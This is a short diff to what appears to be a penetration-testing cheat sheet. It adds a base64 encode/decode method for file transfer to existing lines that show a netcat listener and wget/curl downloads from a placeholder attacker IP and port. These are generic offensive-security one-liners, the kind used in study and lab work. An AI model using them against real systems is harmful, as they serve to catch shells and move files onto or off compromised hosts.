@@ -27,6 +27,9 @@ nc -lnvp PORT
 python3 -m http.server 8000 // server
 wget http://<IP>:<PORT>/file // Download method 1
 curl http://<IP>:<PORT>/<File> -o <Outputfilename> // Download method 2
+// Base 64 method
+base64 -w 0 File // Encoding -w 0 Everything on one line
+echo <Line> | base64 -d > File
 ```
 ***SSH***
 ```bash
